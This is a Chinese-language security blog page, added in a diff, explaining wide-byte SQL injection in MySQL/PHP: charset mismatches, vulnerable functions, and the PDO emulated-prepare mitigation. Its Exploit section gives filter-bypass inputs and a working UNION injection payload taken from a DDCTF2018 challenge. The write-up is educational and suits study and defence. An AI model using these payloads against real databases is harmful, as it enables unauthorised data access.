@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>宽字节注入 | ZenisLTZ&#39;s Blog</title>
+  <meta name="description" content="WideByesInjectionBasicUTF-8UTF-8第一字节的取值范围是：00-7F、C2-F4 Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节,所以F0-F7也会无法被识别12三字节时, 首字节范围是[E0-EF][80-BF][80-BF]四字节时, 首字节范围是[F0-F7][80-BF][80-BF][80-BF] utf8mb4">
+<meta name="keywords" content="mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="宽字节注入">
+<meta property="og:url" content="http://ZenisLTZ.github.io/2018/11/02/WideBytesInj/index.html">
+<meta property="og:site_name" content="ZenisLTZ">
+<meta property="og:description" content="WideByesInjectionBasicUTF-8UTF-8第一字节的取值范围是：00-7F、C2-F4 Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节,所以F0-F7也会无法被识别12三字节时, 首字节范围是[E0-EF][80-BF][80-BF]四字节时, 首字节范围是[F0-F7][80-BF][80-BF][80-BF] utf8mb4">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-11-01T18:41:03.899Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="宽字节注入">
+<meta name="twitter:description" content="WideByesInjectionBasicUTF-8UTF-8第一字节的取值范围是：00-7F、C2-F4 Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节,所以F0-F7也会无法被识别12三字节时, 首字节范围是[E0-EF][80-BF][80-BF]四字节时, 首字节范围是[F0-F7][80-BF][80-BF][80-BF] utf8mb4">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://ZenisLTZ.github.io/2018/11/02/WideBytesInj/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="ZenisLTZ" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+  
+</head>
+
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ZenisLTZ" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">boris lee</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md"></h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ZenisLTZ" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/borislee26@gmail.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-Mail"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>welcome to discuss on Web security</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/PHP/" style="font-size: 13px;">PHP</a> <a href="/tags/mysql/" style="font-size: 14px;">mysql</a> <a href="/tags/python/" style="font-size: 13px;">python</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/11/02/WideBytesInj/" class="title">宽字节注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-11-01T18:38:11.688Z" itemprop="datePublished">2018-11-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/21/登陆界面的SQL注入/" class="title">登陆界面的SQL注入</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-20T17:46:50.143Z" itemprop="datePublished">2018-10-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/21/sqltec_mysql/" class="title">mysql的注入技巧</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-20T17:46:50.115Z" itemprop="datePublished">2018-10-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/10/PySandox/" class="title">Python沙箱</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-10T15:12:55.028Z" itemprop="datePublished">2018-10-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2018/10/09/PhpCodeExcution/" class="title">PHP Code Excution Notes</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2018-10-09T12:02:04.797Z" itemprop="datePublished">2018-10-09</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-WideBytesInj" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      宽字节注入
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2018/11/02/WideBytesInj/" class="article-date">
+	  <time datetime="2018-11-01T18:38:11.688Z" itemprop="datePublished">2018-11-02</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link" href="/tags/mysql/">mysql</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2018/11/02/WideBytesInj/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="WideByesInjection"><a href="#WideByesInjection" class="headerlink" title="WideByesInjection"></a>WideByesInjection</h1><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><h3 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h3><p>UTF-8第一字节的取值范围是：00-7F、C2-F4</p>
+<p>Mysql的utf8其实是阉割版utf-8编码，Mysql中的utf8字符集最长只支持三个字节,所以F0-F7也会无法被识别<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">三字节时, 首字节范围是[E0-EF][80-BF][80-BF]</span><br><span class="line">四字节时, 首字节范围是[F0-F7][80-BF][80-BF][80-BF]</span><br></pre></td></tr></table></figure></p>
+<p>utf8mb4编码方式支持四字节的utf-8</p>
+<h3 id="mysql的字符解析"><a href="#mysql的字符解析" class="headerlink" title="mysql的字符解析"></a>mysql的字符解析</h3><p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;character_set%&quot;;</span><br><span class="line">+--------------------------+-----------------------------------+</span><br><span class="line">| Variable_name            | Value                             |</span><br><span class="line">+--------------------------+-----------------------------------+</span><br><span class="line">| character_set_client     | utf8                              |</span><br><span class="line">| character_set_connection | utf8                              |</span><br><span class="line">| character_set_database   | utf8                              |</span><br><span class="line">| character_set_filesystem | binary                            |</span><br><span class="line">| character_set_results    | utf8                              |</span><br><span class="line">| character_set_server     | utf8                              |</span><br><span class="line">| character_set_system     | utf8                              |</span><br><span class="line">| character_sets_dir       | D:\phpStudy\MySQL\share\charsets\ |</span><br><span class="line">+--------------------------+-----------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; set names gbk;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;character_set%&quot;;</span><br><span class="line">+--------------------------+-----------------------------------+</span><br><span class="line">| Variable_name            | Value                             |</span><br><span class="line">+--------------------------+-----------------------------------+</span><br><span class="line">| character_set_client     | gbk                               |</span><br><span class="line">| character_set_connection | gbk                               |</span><br><span class="line">| character_set_database   | utf8                              |</span><br><span class="line">| character_set_filesystem | binary                            |</span><br><span class="line">| character_set_results    | gbk                               |</span><br><span class="line">| character_set_server     | utf8                              |</span><br><span class="line">| character_set_system     | utf8                              |</span><br><span class="line">| character_sets_dir       | D:\phpStudy\MySQL\share\charsets\ |</span><br><span class="line">+--------------------------+-----------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p><code>set names gbk;</code>以后，<code>character_set_client</code>、<code>character_set_connection</code>、<code>character_set_results</code>等与客户端相关的配置字符集都变成了gbk，但<code>character_set_database</code>、<code>character_set_server</code>等服务端相关的字符集还是utf8。</p>
+<h3 id="mysql-api"><a href="#mysql-api" class="headerlink" title="mysql api"></a>mysql api</h3><ul>
+<li><p>mysql_set_charset(“utf8”, $link) (php5.2.3+)</p>
+<p>规定当与数据库服务器进行数据传送时要使用的默认字符集，同时会设定好客户端的编码</p>
+</li>
+<li><p>mysql_query(“SET NAMES ‘UTF8’”);</p>
+<ul>
+<li>character_set_client</li>
+<li>character_set_connection</li>
+<li>character_set_results</li>
+</ul>
+</li>
+<li><p>mysql_client_encoding($link)</p>
+<p>可以看到客户端编码</p>
+</li>
+</ul>
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><h3 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h3><p>(PHP 4 &gt;= 4.0.5, PHP 5, PHP 7)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string iconv ( string $in_charset , string $out_charset , string $str )</span><br></pre></td></tr></table></figure>
+<p>将字符串 str 从 in_charset 转换编码到 out_charse</p>
+<ul>
+<li>可以对用户名做如下处理</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username = iconv(<span class="string">'GBK'</span>, <span class="string">'UTF-8'</span>, $_GET[<span class="string">'para'</span>]);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在character_set_client为binary情况下，只有借助其它函数的转换如iconv等来引入特殊字符。</li>
+</ul>
+<h3 id="mb-convert-encoding"><a href="#mb-convert-encoding" class="headerlink" title="mb_convert_encoding"></a>mb_convert_encoding</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string mb_convert_encoding ( string $str , string $to_encoding [, mixed $from_encoding = mb_internal_encoding() ] )</span><br></pre></td></tr></table></figure>
+<p>​    $from_encoding用 “auto” 表示成 “ASCII,JIS,UTF-8,EUC-JP,SJIS” */<br>​    $str = mb_convert_encoding($str, “EUC-JP”, “auto”);</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username = mb_convert_encoding($_GET[<span class="string">'para'</span>], <span class="string">'utf-8'</span>, <span class="string">'gbk'</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="mysql-real-escape-string-SET-NAMES-gbk"><a href="#mysql-real-escape-string-SET-NAMES-gbk" class="headerlink" title="mysql_real_escape_string+SET NAMES gbk"></a>mysql_real_escape_string+SET NAMES gbk</h3><p>real_escape会根据客户端的设定进行过滤，但仅仅SET NAMES并不会改变客户端的编码，要mysql_set_charset才行</p>
+<h3 id="创建table时"><a href="#创建table时" class="headerlink" title="创建table时"></a>创建table时</h3><p>create table  … character_set=..</p>
+<p>还有就是数据库创建或更改的时候改了服务器端的编码</p>
+<h3 id="PDO-prepare预编译"><a href="#PDO-prepare预编译" class="headerlink" title="PDO prepare预编译"></a>PDO prepare预编译</h3><p><a href="https://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html" target="_blank" rel="noopener">https://ilia.ws/archives/103-mysql_real_escape_string-versus-Prepared-Statements.html</a><br>PHP&lt;5.3.6时,还是存在WideByteInj的,本地模拟prepare后,再把完整的语句发送到mysql服务器<br>应该用ATTR_EMULATE_PREPARES来禁用prepare本地模拟<br>$db-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$db=new PDO(&quot;mysql:host=localhost; dbname=demo&quot;, &quot;user&quot;, &quot;pass&quot;);</span><br><span class="line">$db-&gt;exec(&quot;set names gbk&quot;);      //实际上并未修改mysql服务器端</span><br><span class="line">$sql=&quot;select * from test where name = ? and password = ?&quot;;</span><br><span class="line">$pre=$db-&gt;prepare($sql);</span><br><span class="line">$res=$pre-&gt;execute(array($name,$pass));</span><br></pre></td></tr></table></figure>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="识别不出的字符被忽略"><a href="#识别不出的字符被忽略" class="headerlink" title="识别不出的字符被忽略"></a>识别不出的字符被忽略</h3><p>可以绕过php中的验证</p>
+<p>client: utf8 — server: latin1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin === </span><br><span class="line">admin%c2  </span><br><span class="line">admin%e4</span><br><span class="line">admin%e4%bd</span><br></pre></td></tr></table></figure></p>
+<h3 id="服务器端解析为宽字符"><a href="#服务器端解析为宽字符" class="headerlink" title="服务器端解析为宽字符"></a>服务器端解析为宽字符</h3><p>和反斜杠一起解释成宽字节</p>
+<p>绕过加上反斜杠的过滤addslashes等</p>
+<p>client: utf8 — server: gbk<br>!! 如果一个字符uft8无法解码，则会去转化为ascii(255位版),但python的decode不会自动这样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df5c</span><br><span class="line">gbk:	運		b&apos;\xdf\\&apos;.decode(&apos;gbk&apos;)  //这里的\\是python里转义表达</span><br><span class="line">ascii:	ß\		chr(0xdf)</span><br></pre></td></tr></table></figure>
+<h3 id="客户端解析为宽字符"><a href="#客户端解析为宽字符" class="headerlink" title="客户端解析为宽字符"></a>客户端解析为宽字符</h3><p>传入宽字符但被拆开</p>
+<p>传入宽字符在server端被拆开成单字节，从而可以传入末尾以反斜杠结尾的字符来绕过</p>
+<p>client big5 — server utf8</p>
+<ul>
+<li><p>DDCTF2018 Web3 注入的奥妙</p>
+<p>闭合单引号</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A45C</span><br><span class="line">- Big5(client):	 么		b&apos;\xA4\x5C&apos;.decode(&apos;big5&apos;)</span><br><span class="line">- ascii(server): ¤\		 chr(0xa4)</span><br><span class="line">B05C</span><br><span class="line">- Big5(client):	豹</span><br><span class="line">- utf8(server):	°\</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/well/getmessage/1豹&apos; and 2=1 uniunionon select `id`,`pattern` COLLATE utf8_general_ci,`action` COLLATE utf8_general_ci from route_rules – –</span><br></pre></td></tr></table></figure>
+<p>utf8_general_ci表示大小写不敏感</p>
+<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p><a href="https://blog.csdn.net/caiqiiqi/article/details/68952300" target="_blank" rel="noopener">MySQL 宽字节注入——关于GBK编码和UTF-8编码</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysql字符编码利用技巧</a></p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://ZenisLTZ.github.io/2018/11/02/WideBytesInj/" title="宽字节注入" target="_blank" rel="external">http://ZenisLTZ.github.io/2018/11/02/WideBytesInj/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ZenisLTZ" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ZenisLTZ" target="_blank"><span class="text-dark">boris lee</span><small class="ml-1x"></small></a></h3>
+        <div>Web security researcher</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    
+    <li class="next">
+      <a href="/2018/10/21/登陆界面的SQL注入/" title="登陆界面的SQL注入"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ZenisLTZ" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/borislee26@gmail.com" target="_blank" title="E-Mail" data-toggle=tooltip data-placement=top><i class="icon icon-E-Mail"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
